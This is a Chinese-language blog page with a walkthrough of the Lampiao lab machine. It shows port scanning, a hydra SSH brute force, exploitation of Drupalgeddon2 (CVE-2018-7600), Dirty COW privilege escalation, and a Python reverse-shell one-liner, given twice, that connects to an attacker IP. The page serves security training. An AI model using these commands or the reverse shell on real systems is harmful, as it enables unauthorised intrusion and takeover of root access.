@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透:Lampiao | xxxRetr0</title><meta name="author" content="xxxRetr0"><meta name="copyright" content="xxxRetr0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Lampiao：1、nmap 192.168.133.129 -p-目标计算机上有三个可用的开放端口22、80、1898端口  进入目标站点  2、信息枚举：http:&#x2F;&#x2F;192.168.133.129:1898&#x2F; -&gt; Read more 发现改页面信息：http:&#x2F;&#x2F;192.168.133.129:1898&#x2F;?q&#x3D;node&#x2F;2页面发现：audio.m4a：语音获得用户名：tiagoqrc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透:Lampiao">
+<meta property="og:url" content="http://example.com/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/index.html">
+<meta property="og:site_name" content="xxxRetr0">
+<meta property="og:description" content="Lampiao：1、nmap 192.168.133.129 -p-目标计算机上有三个可用的开放端口22、80、1898端口  进入目标站点  2、信息枚举：http:&#x2F;&#x2F;192.168.133.129:1898&#x2F; -&gt; Read more 发现改页面信息：http:&#x2F;&#x2F;192.168.133.129:1898&#x2F;?q&#x3D;node&#x2F;2页面发现：audio.m4a：语音获得用户名：tiagoqrc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2024-02-01T12:16:07.000Z">
+<meta property="article:modified_time" content="2024-02-01T12:18:16.862Z">
+<meta property="article:author" content="xxxRetr0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透:Lampiao',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-02-01 20:18:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="xxxRetr0" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://sm.ms/image/mREjiyC7x2WsdB4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xxxRetr0</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透:Lampiao</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-01T12:16:07.000Z" title="Created 2024-02-01 20:16:07">2024-02-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-02-01T12:18:16.862Z" title="Updated 2024-02-01 20:18:16">2024-02-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透:Lampiao"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Lampiao：<br>1、nmap 192.168.133.129 -p-<br>目标计算机上有三个可用的开放端口22、80、1898端口</p>
+<p><img src="https://s2.loli.net/2024/01/30/x6zlmHLiG9n283Y.png" alt="image-20240130165900701"></p>
+<p>进入目标站点</p>
+<p><img src="https://s2.loli.net/2024/01/30/qFSkusT8pVg7W45.png" alt="image-20240130174146024"></p>
+<p>2、信息枚举：<a target="_blank" rel="noopener" href="http://192.168.133.129:1898/">http://192.168.133.129:1898/</a> -&gt; Read more 发现改页面信息：<br><a target="_blank" rel="noopener" href="http://192.168.133.129:1898/?q=node/2">http://192.168.133.129:1898/?q=node/2</a><br>页面发现：<br>audio.m4a：语音获得用户名：tiago<br>qrc.png：图片二维码扫描获得信息，需要爆破</p>
+<p>发现文件，第一个是一段音频，第二个是一张二维码</p>
+<p><img src="https://s2.loli.net/2024/01/30/IitZ8OTypcoFQ5N.png" alt="image-20240130174439933"></p>
+<p>一段语音，念的：user tiago</p>
+<p><img src="https://s2.loli.net/2024/01/30/rPRXaF6fxSJkwIE.png" alt="image-20240130174522296"></p>
+<p>3、爆破下网站目录<br>dirb <a target="_blank" rel="noopener" href="http://192.168.133.129:1898/">http://192.168.133.129:1898</a></p>
+<p>一级目录爆破（二级目录爆破 <a target="_blank" rel="noopener" href="http://192.168.133.129:1898/">http://192.168.133.129:1898</a> -w）</p>
+<p><img src="https://s2.loli.net/2024/01/30/NJEvRdiQlX4LzFG.png" alt="image-20240130204320400"></p>
+<p>获得url：<a target="_blank" rel="noopener" href="http://192.168.133.129:1898/robots.txt">http://192.168.133.129:1898/robots.txt</a></p>
+<p><img src="https://s2.loli.net/2024/01/30/MOIjEB5WHb9dQ4U.png" alt="image-20240130205051543"></p>
+<p>继续枚举获得：<a target="_blank" rel="noopener" href="http://192.168.133.129:1898/CHANGELOG.txt">http://192.168.133.129:1898/CHANGELOG.txt</a><br>发现是：Drupal 7.54, 2017-02-01</p>
+<p><img src="https://s2.loli.net/2024/01/30/pe13k9mPM2ugbIW.png" alt="image-20240130205010633"></p>
+<p>存在可利用exp：</p>
+<p><img src="https://s2.loli.net/2024/01/30/yWpTVilANL2ba7g.png" alt="image-20240130205348491"></p>
+<p>4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典<br>cewl <a target="_blank" rel="noopener" href="http://192.168.133.129:1898/?q=node/1">http://192.168.133.129:1898/?q=node/1</a> -w passwd.txt</p>
+<p><img src="https://s2.loli.net/2024/01/30/douzq5JSfBKCjAc.png" alt="image-20240130205809174"></p>
+<p>5、hydra爆破<br>hydra -l tiago -P dayu.txt 192.168.133.129 ssh<br>先利用cewl来生成一份结合网站目标的社工性质的密码字典，然后九头蛇暴力破解得到用户密码：</p>
+<p>[22][ssh] host: 192.168.133.129   login: tiago   password: Virgulino</p>
+<p>用户: tiago<br>密码: Virgulino</p>
+<p><img src="https://s2.loli.net/2024/01/30/W6foFwnTMhUDzcJ.png" alt="image-20240130210012804"></p>
+<p>6、登录ssh<br>ssh <a href="mailto:&#116;&#x69;&#x61;&#103;&#111;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x33;&#51;&#46;&#49;&#x32;&#x39;">&#116;&#x69;&#x61;&#103;&#111;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x33;&#51;&#46;&#49;&#x32;&#x39;</a><br>发现是低权限用户！需要提权！</p>
+<p><img src="https://s2.loli.net/2024/01/30/rb48OfFZ1oz6vwI.png" alt="image-20240130210241742"></p>
+<p>7、提权</p>
+<p>谷歌搜索：Drupal 7.54 exploit<br>#1063256 [CVE-2018-7600] Remote Code Execution due to …</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a></p>
+<p>msfconsole<br>search  Drupal<br>set rport 1898<br>set rhosts 192.168.133.129</p>
+<p>meterpreter &gt; shell<br>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+<p>成功通过漏洞渗透进入系统，获得低权限用户，和前面ssh登陆的tiago用户权限类似，这是另外一种渗透的方法。<br>下一步要找到反弹shell获取root权限，通过网上对Durpal 7版本2016年都可以使用dirty（脏牛）进行提权，非常有名的一个漏洞提权目前已经修复，仅供参考学习。</p>
+<p>8、提权2<br>searchsploit dirty<br>使用：Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race Condition Privile | linux/local/40847.cpp<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40847">Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race Condition Privilege Escalation (/etc/passwd Method) - Linux local Exploit (exploit-db.com)</a></p>
+<p>./les.sh    #检测可能可用的exp</p>
+<p><img src="https://s2.loli.net/2024/01/30/OolGNYdavXDE386.png" alt="image-20240130225031479"></p>
+<p><img src="https://s2.loli.net/2024/01/30/Pqd6LYNzTv58Igb.png" alt="image-20240130230510772"></p>
+<p><img src="https://s2.loli.net/2024/01/30/4ECps6wRKUoVMuh.png" alt="image-20240130230615191"></p>
+<p>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/kali/桌面/<br>继续开启本地pthon服务，然后把40847.cp发送到靶机上：<br>python -m SimpleHTTPServer 8081<br>&lt;——提一嘴：py2：python -m SimpleHTTPServer  端口号    ——&gt;<br>&lt;——                py3：python -m http.server 端口号                  ——&gt;</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.133.53:8081/40847.cpp">http://192.168.133.53:8081/40847.cpp</a></p>
+<p><img src="https://s2.loli.net/2024/01/30/atNhiEn618kRdQC.png" alt="image-20240130231053789"></p>
+<p>命令：g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dayu 40847.cpp -lutil</p>
+<p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std=c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow<br>执行gcc编译可执行文件，可直接提权。</p>
+<p>./40847</p>
+<p>Root password is:   dirtyCowFun<br>获得root用户密码！</p>
+<p><img src="https://s2.loli.net/2024/01/30/139NbUPAEvpWVHi.png" alt="image-20240130231650602"></p>
+<p>9、登录root-ssh</p>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#x33;&#x33;&#46;&#x31;&#x32;&#57;">&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#x33;&#x33;&#46;&#x31;&#x32;&#57;</a><br>root@lampiao:~# cat /root/flag.txt<br>9740616875908d91ddcdaa8aea3af366</p>
+<p><img src="https://s2.loli.net/2024/01/30/vZ93lVUhX1yIdWi.png" alt="image-20240130231933243"></p>
+<hr>
+<p>拓展思路：<br>1、通过AWVS+xray跑出了poc：poc-yaml-drupal-cve-2018-7600-rce<br>那么Xray是给出了两篇poc的文章：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a></p>
+<p>通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载！<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br>proxychains git clone <a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2.git">https://github.com/dreadlocked/Drupalgeddon2.git</a></p>
+<p>sudo gem install highline     –安装模块</p>
+<p>安装完highline后即可执行：<br>./drupalgeddon2.rb <a target="_blank" rel="noopener" href="http://192.168.133.129:1898/">http://192.168.133.129:1898/</a></p>
+<p>通过poc发现对方是7.x的drupal版本漏洞，通过base64方法上传shell.php成功获得shell！</p>
+<p>然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：<br>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.211.55.28”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>nc -vlp 6666<br>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>cd /tmp<br>wget <a target="_blank" rel="noopener" href="http://10.211.55.28:8081/40847.cpp">http://10.211.55.28:8081/40847.cpp</a><br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil<br>./40847<br>获得root用户密码！</p>
+<p>登录root-ssh：<br>ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#51;&#51;&#x2e;&#x31;&#50;&#57;">&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#51;&#51;&#x2e;&#x31;&#50;&#57;</a><br>root@lampiao:~# cat /root/flag.txt<br>9740616875908d91ddcdaa8aea3af366</p>
+<hr>
+<p>通过AWVS+xray跑出了poc：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a><br>通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br>proxychains git clone <a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2.git">https://github.com/dreadlocked/Drupalgeddon2.git</a></p>
+<p>sudo gem install highline<br>./drupalgeddon2.rb <a target="_blank" rel="noopener" href="http://192.168.133.129:1898/">http://192.168.133.129:1898/</a><br>然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：<br>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.211.55.28”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>nc -vlp 6666<br>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>cd /tmp<br>wget <a target="_blank" rel="noopener" href="http://10.211.55.28:8081/40847.cpp">http://10.211.55.28:8081/40847.cpp</a><br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil<br>./40847</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">xxxRetr0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/">http://example.com/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/04/08/VulnHub-DarkHole-1/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">VulnHub-DarkHole-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://sm.ms/image/mREjiyC7x2WsdB4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xxxRetr0</div><div class="author-info__description">yaHuuuuuu</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxRetr0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透:Lampiao"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透:Lampiao"/></a><div class="content"><a class="title" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透:Lampiao">渗透:Lampiao</a><time datetime="2024-02-01T12:16:07.000Z" title="Created 2024-02-01 20:16:07">2024-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnHub-DarkHole-1"/></a><div class="content"><a class="title" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1">VulnHub-DarkHole-1</a><time datetime="2023-04-08T12:46:14.000Z" title="Created 2023-04-08 20:46:14">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU-easy_web"/></a><div class="content"><a class="title" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web">BUU-easy_web</a><time datetime="2023-03-16T04:30:08.000Z" title="Created 2023-03-16 12:30:08">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="cve-2018-12613-PhpMyadmin后台文件包含"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cve-2018-12613-PhpMyadmin后台文件包含"/></a><div class="content"><a class="title" href="/2023/03/16/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="cve-2018-12613-PhpMyadmin后台文件包含">cve-2018-12613-PhpMyadmin后台文件包含</a><time datetime="2023-03-16T04:28:02.000Z" title="Created 2023-03-16 12:28:02">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/XXE-Fake-XML-cookbook/" title="XXE-Fake XML cookbook"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE-Fake XML cookbook"/></a><div class="content"><a class="title" href="/2023/02/27/XXE-Fake-XML-cookbook/" title="XXE-Fake XML cookbook">XXE-Fake XML cookbook</a><time datetime="2023-02-27T12:59:11.000Z" title="Created 2023-02-27 20:59:11">2023-02-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By xxxRetr0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
